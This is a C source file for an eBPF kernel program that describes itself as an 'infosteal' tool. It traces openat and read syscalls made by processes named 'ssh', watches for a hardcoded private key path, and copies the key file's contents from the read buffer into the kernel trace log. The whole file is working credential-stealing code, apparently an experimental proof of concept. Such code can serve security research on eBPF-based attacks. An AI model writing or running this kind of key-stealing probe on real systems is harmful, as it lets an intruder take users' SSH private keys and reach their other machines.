// infosteal: steal files opened for reading, here reading ssh key
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include <stddef.h>
#include <stdint.h>

// for offsetof(struct pt_regs, ...)
#include <linux/ptrace.h>   // asm/ptrace.h
#include <asm/unistd_64.h>

#define MAX_BUF 128
#define MAX_ENTRIES 10240
#define TASK_COMM_LEN 16

char LICENSE[] SEC("license") = "GPL";


// Define a BPF map to store the filenames
// Key: PID (u32), Value: filename (char array)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} exec_argv1_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} openat_path_map SEC(".maps");


int is_ssh(struct pt_regs *ctx)
{
    char comm[TASK_COMM_LEN];
    
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // check if bash
    if(__builtin_memcmp(comm, "ssh", 3) == 0) {
        
        return 1;
    }
    return 0;
}


SEC("raw_tracepoint/sys_enter")
int tp_openat_enter(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_openat || !is_ssh(ctx))
    {
        return 0;
    }
    
    // bpf_printk("Hello from tp_openat_enter\n");

    unsigned long pathname_ptr = 0;
    if (bpf_probe_read(&pathname_ptr, sizeof(pathname_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        return 0;
    }

    if (!pathname_ptr)
        return 0;

    // char fname[MAX_BUF];
    // if (bpf_probe_read_user_str(fname, sizeof(fname), (const void *)pathname_ptr) > 0)
    // {
    //     bpf_printk("openat pathname: %s\n", fname);
    // }
    char pathname[MAX_BUF];
    if (bpf_probe_read_user_str(pathname, sizeof(pathname), (const void *)pathname_ptr) <= 0)
        return 0;

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    // // --- look up argv[1] for this PID ---
    // char *argv1 = bpf_map_lookup_elem(&exec_argv1_map, &pid);
    // if (!argv1)
    //     return 0;


    if (__builtin_memcmp(pathname, "/home/dt/.ssh/id_rsa", sizeof("/home/dt/.ssh/id_rsa")) == 0) {
        bpf_printk("openat match: pathname=%s equals argv1=%s\n", pathname, "/home/dt/.ssh/id_rsa");
        bpf_map_update_elem(&openat_path_map, &pid, &pathname, BPF_ANY);
    }


    return 0;
}

SEC("raw_tracepoint/sys_exit")
int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_read || !is_ssh(ctx))
    {
        return 0;
    }
    // bpf_printk(" Hello from tp_read_exit\n");

    int ret = 0;
    if (bpf_probe_read(&ret, sizeof(ret),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rax))) < 0)
    {
        return 0;
    }

    if (ret <= 0) 
        return 0;  // nothing read

    int fd = 0;
    if (bpf_probe_read(&fd, sizeof(fd),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
        return 0;

    if(fd!=4)
    {
        return 0;
    }

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
    // struct fd_key key = {.pid = pid, .fd = fd};

    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
    if (!pathname)
        return 0;

    // Now grab buffer pointer (2nd arg of read = rsi)
    unsigned long buf_ptr = 0;
    if (bpf_probe_read(&buf_ptr, sizeof(buf_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        return 0;
    }
    
    char data[MAX_BUF];
    int copy = ret < sizeof(data) ? ret : sizeof(data)-1;
    if (bpf_probe_read_user(data, copy, (void *)buf_ptr) < 0)
        return 0;
    data[copy] = 0;

    bpf_printk("read: pid=%d fd=%d path=%s data=%s ret=%d\n",
               pid, fd, pathname, data, ret);

    return 0;
}